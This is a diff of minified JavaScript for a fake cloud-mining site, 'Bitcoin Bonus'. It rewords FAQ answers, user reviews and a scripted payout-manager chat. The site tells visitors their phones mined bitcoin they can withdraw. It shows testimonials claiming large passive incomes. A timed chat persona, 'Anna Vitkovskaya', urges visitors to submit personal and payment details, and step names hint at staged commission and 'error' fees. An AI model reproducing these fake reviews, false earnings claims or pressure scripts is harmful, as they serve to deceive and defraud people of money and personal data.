-                        a: "At the moment, such cases have become more frequent. This may be related to fraudulent activities and hacking of mobile phones using virus programs. In this way, attackers lure information about your phone and register it on Bitcoin Bonus.<br>Faced with this problem in 2021, we developed an IP remembering and re-registration system. That is, if your phone was used by attackers to mine cryptocurrency without your consent, you can, by logging into the service from this phone, automatically rewrite the device's IP address to yours and withdraw the earned funds. And the attackers will forever lose all data from your device, and will never be able to log into your personal account again."
+                        q: "My phone was mining cryptocurrency without my actions related to your service. Why does it show that my phone has been mining all this time, can I get this money?",
+                        a: "At the moment, such cases have become more frequent. This may be related to fraudulent activities and hacking of mobile phones using virus programs. In this way, attackers lure data about your phone and register it on Bitcoin Bonus.<br>\nFaced with this problem in 2021, we developed an IP remembering and re-registration system. That is, if your phone was used by attackers to mine cryptocurrency without your consent, you can, by logging into the service from this phone, automatically rewrite the device's IP to yours and withdraw the earned funds. And the attackers will forever lose all data from your device and will no longer be able to access your personal account."
                     }, {
-                        q: "How do I exchange mined bitcoins for my currency and withdraw my earnings?",
-                        a: "Our service cooperates with the official cryptocurrency exchange Binance. The exchange rate of bitcoin and other currencies can be viewed in your personal account. For convenience of withdrawing funds to your card/wallet, we have made it possible to withdraw funds directly on our website. Just contact the manager, they will help you withdraw funds within 10 minutes."
+                        q: "How do I exchange mined bitcoins for my currency and withdraw the earned funds?",
+                        a: "Our service cooperates with the official cryptocurrency exchange Binance. The exchange rate of bitcoin and other currencies can be viewed in your personal account. For the convenience of withdrawing funds to your card/wallet, we have made it possible to withdraw funds directly on our website. To do this, simply contact the manager, they will help you withdraw funds within 10 minutes."
                     }, {
                         q: "What does my income depend on?",
-                        a: "Your income will depend on the power of your phone or tablet. Your income will also be affected by the bitcoin exchange rate at the time of sale. To avoid losing a lot of money, you can always write to the manager or in the online chat in your personal account."
+                        a: "Your income will depend on the power of your phone or tablet. Also, your income will be affected by the bitcoin exchange rate at the time of its sale. In order not to lose a lot of money, you can always write to the manager or in the online chat in your personal account."
                     }, {
-                        q: "My phone drains quickly, can I disable auto Bitcoin collection?",
-                        a: "Our service uses no more than 30% of your smartphone's power for computational operations to find bitcoins. This is the optimal power for safe cryptocurrency mining. You can always disable or enable auto bonus collection in your personal account in the 'Settings' section."
+                        q: "My phone drains quickly, can I turn off automatic bitcoin collection?",
+                        a: "Our service uses no more than 30% of your smartphone's power for computational operations to search for bitcoin. This is the optimal power for safe cryptocurrency mining. You can always turn off or on automatic bonus collection in your personal account in the 'settings' section."
                     }]
                 }
             }
@@ -4519,7 +4594,7 @@
                     staticClass: "mt-5"
                 }, [a("div", {
                     staticClass: "h6 review__heading"
-                }, [t._v("On service:")]), a("p", {
+                }, [t._v("On the service:")]), a("p", {
                     staticClass: "text-numbers review__times"
                 }, [t._v(t._s(e.time))])])])])])])
             }
@@ -4535,9 +4610,9 @@
                 staticClass: "h2"
             }, [s("span", {
                 staticClass: "text-success d-md-block"
-            }, [t._v("What our users say about us")]), t._v(" every day!\n              ")]), s("h5", {
+            }, [t._v("What our users say about us every day!")]), t._v("\n              ")]), s("h5", {
                 staticClass: "font-weight-medium text-center"
-            }, [t._v("Check out reviews about our service")])])
+            }, [t._v("Check out reviews of our service")])])
         }
         ]
           , ut = {
@@ -4548,25 +4623,25 @@
                         name: "Leonid T.",
                         avatar: "review-2.jpg",
                         screenshot: "sber.jpg",
-                        solution: "The time has come when I am ready to leave my review about the Bitcoin Bonus service!<br>Background: I used to work as an ordinary security guard at a shopping center for pennies. And I was always looking for ways to earn money online. I started learning a lot, and every time I saw news about Bitcoin and other cryptocurrencies. I tried to grab at least a little hope for good money in this abundance of information.<br>And then one day Forbes wrote an article about the opening in Russia and the CIS of an international Cloud Mining service. And when Bitcoin Bonus announced that they are ready to use any device with a processor for mining expensive cryptocurrency, I realized that this is the future! And my inner voice told me - THIS IS IT! Don't waste time! I listened and waited for the official opening of the service in Russia and the CIS.<br>Now I am already earning from $1,000 per month in passive income using an ordinary phone. And I can't imagine life without Bitcoin Bonus. I recommend it to everyone!",
-                        time: "Over 1 year"
+                        solution: "The time has come when I am ready to leave my review about the Bitcoin Bonus service!<br>\n          Background: I used to work as a regular security guard in a shopping mall for pennies. I was always looking for ways to earn money online. I learned a lot, and each time I saw news about Bitcoin and other cryptocurrencies. I tried to grab onto even a small hope for good money in this abundance of information.<br>\n          And then one day Forbes published an article about the opening in Russia and the CIS of an international service for Cloud Mining. And when Bitcoin Bonus announced that they were ready to use any device with a processor for mining expensive cryptocurrency, I realized that this is the future! And my inner voice told me - THIS IS IT! don't waste time! I listened and waited for the official opening of the service in the Russian Federation and the CIS.<br>\n          Now I earn from 100,000 rubles in passive income using a regular phone. And I can't imagine life without Bitcoin Bonus.<br>\n          I recommend it to everyone! ",
+                        time: "More than 1 year"
                     }, {
                         name: "Zinaida K.",
                         avatar: "review-4.jpg",
                         screenshot: null,
-                        solution: "I had never heard of bitcoin before, being a person from a different era, I was far from it!<br>I saw a video on how to earn money in this way, and realized that THE AGE OF MODERN TECHNOLOGY KNOWS NO BOUNDS! I decided to try it, at first I was earning $50-100 in the best months. It was just a nice supplement to my pension. But recently the bitcoin exchange rate started to rise, and now my monthly income is $500!<br>I want to thank those who create innovation in the field of passive income! Thank you.",
+                        solution: "I had never heard of bitcoin before, as a person from another era I was far from it!<br>\n          I saw a video on how to earn money this way, and I realized that - THE AGE OF MODERN TECHNOLOGY KNOWS NO BOUNDS! I decided to try, at first I earned 50-100$ in the best months.<br>\n          It was just a good addition to my pension. But recently the bitcoin exchange rate started to grow, and now my monthly income is already 500$!<br>\n          I want to thank those who create innovation in the field of passive income! Thank you.",
                         time: "2 years"
                     }, {
                         name: "Alexander L.",
                         avatar: "review-3.jpg",
                         screenshot: null,
-                        solution: "Everything is great! Good service, pleasant to go into the chat in the evening and talk about everything with like-minded people and smart people! It's great that managers also help, very responsive!<br>Considering that the bitcoin exchange rate on the exchange is constantly growing, you can safely bet that the service will be relevant for a long time.",
+                        solution: "Everything is great! Good service, nice to go to the chat in the evening and talk about everything with like-minded people and smart people! Great that managers also help, very responsive!<br>\n          Considering that the bitcoin exchange rate on the exchange is constantly growing, you can safely bet that the service will be relevant for a long time.",
                         time: "1 month"
                     }, {
                         name: "Lyubov P.",
                         avatar: "review-1.jpg",
                         screenshot: "qiwi.jpg",
-                        solution: "Excellent service for those who have no idea about the world of Cryptocurrency.<br>In a few simple steps you can earn good money, I'm only worried that if everyone knows about Bitcoin Bonus, there will be less money here!<br>I want to note the reliable IP remembering system, before phones of ordinary people were constantly hacked and mined cryptocurrency without their knowledge. Now it seems they fixed it, but people still write every day in the chat that they logged into the service and have 'some kind' of currency.)",
+                        solution: "Great service for those who have no idea about the world of Cryptocurrency.<br>\n          In a few simple steps you can earn good money, I only worry that if everyone knows about Bitcoin Bonus, there will be less money here!<br>\n          I want to note the reliable IP remembering system, previously phones of ordinary people were constantly hacked and mined cryptocurrency without their knowledge. Now it seems they fixed it, but people still write daily in the chat that they logged into the service and they have 'some kind' of currency.",
                         time: "3 years"
                     }]
                 }
@@ -4591,7 +4666,7 @@
                 staticClass: "section_title text-center mb_70"
             }, [s("h2", {
                 staticClass: "title_h2 text-white"
-            }, [t._v("History of " + t._s(t.$store.getters.sitename))]), s("p", {
+            }, [t._v("Service history " + t._s(t.$store.getters.sitename))]), s("p", {
                 staticClass: "title_p text-white"
             }, [t._v("How and when we started")]), s("span", {
                 staticClass: "bottom_line"
@@ -4624,11 +4699,11 @@
                     monthsFull: new Array("January","February","March","April","May","June","July","August","September","October","November","December"),
                     events: [{
                         monthOffset: "May 2019",
-                        text: "Launch of ".concat(this.$store.getters.sitename, " in the USA"),
+                        text: "Opening of the service ".concat(this.$store.getters.sitename, " in the USA"),
                         position: "top"
                     }, {
                         monthOffset: 20,
-                        text: "First half a million paid out to US citizens",
+                        text: "First half million paid to US citizens",
                         position: "down"
                     }, {
                         monthOffset: 16,
@@ -4745,7 +4820,7 @@
                 ,
                 t.prototype.$reachGoal = function(t, e) {
                     if ("development" === Tt)
-                        return console.warn("Goals are not available in development mode"),
+                        return console.warn("In development mode, goals are not available"),
                         !1;
                     e ? this.$metrika && this.$metrika.reachGoal(t, e) : this.$metrika && this.$metrika.reachGoal(t)
                 }
@@ -4959,10 +5034,10 @@
         t.exports = s.p + "img/bit-magnet.c851cb06.png"
     },
     "6e1d": function(t, e) {
-        t.exports = "data:image/png;base64,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"
+        t.exports = "data:image/png;base64,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"
     },
     "720e": function(t, e) {
-        t.exports = "data:image/png;base64,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"
+        t.exports = "data:image/png;base64,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"
     },
     7496: function(t, e, s) {
         "use strict";
@@ -4984,15 +5059,15 @@
         e["a"] = {
             order: ["lawyerrequisits", "requisits", "lawyerexchange", "exchangeBTC", "lawyerreceipt", "receipt", "comissionfp", "error3405", "lawyercomission", "comissionsp", "express", "cadastr", "transitbooking", "transitactivation", "signature", "signatureverify", "tls", "manual", "limitex", "momentum", "fin"],
             lawyerrequisits: {
-                name: "Manager before requisites",
+                name: "Manager before details",
                 loadtime: 8,
                 isLoading: !0,
                 loadsteps: ["Connecting with manager Anna to process withdrawal"],
-                statusMessage: "Anna is online now",
+                statusMessage: "Anna is currently online",
                 upsellType: "chat",
                 chat: {
                     name: "Anna Vitkovskaya",
-                    job: "Lead Manager, Payments Department",
+                    job: "Lead Manager of Payout Department",
                     avatar: "anna-mng.jpg",
                     waitForAnswer: !0,
                     delay: [9, 6, 0, 12, 6, 5, 6, 10, 6],
@@ -5001,9 +5076,9 @@
                         text: "3dotsFloat"
                     },
                     sendAnimation: "sharp",
-                    chatPull: ['{{greetingTime}}! My name is Anna, I am the lead manager of the payment department of the service "'.concat(n["a"].state[o].sitename, '".<br> According to the information I have, you have not appeared on the site for <span class="text-numbers">{{prevDayYear}}</span> days. In this regard, have you previously received a notification that you are entitled to a payment from ').concat(n["a"].state[o].sitename, "? {{next}}"), "I am waiting for your response{{next}}", '{{answerBtn:["Yes, I received", "I don\'t remember", "I didn\'t notice"]}}', 'I have an approved active request from your account to withdraw the Bitcoin bonuses you earned. In order to transfer funds from the service to your card or wallet, we need to have your questionnaire. I will now look for this questionnaire, it will take no more than a minute.{{loading:{duration:14}{delay:9}"Searching for your questionnaire. Please wait..."}}', "Thank you for waiting. I checked and could not find your questionnaire in our database. This means that you have not yet withdrawn the accumulated bitcoins from the service. {{next}}", "I have already started processing your payment, but I need your questionnaire and the details to which we will make the payment. {{next}}", 'Please fill it out right now so that we can exchange the bitcoins into your currency {{converting_geoCur}} as quickly as possible. The system indicates that you are entitled to receive <span class="text-numbers">{{moneyPageBased}}</span> {{next}}', 'After you fill out the questionnaire, I will contact you and help you order the payment within <span class="text-numbers">15 minutes</span><br>\n        {{upsellbtn}}']
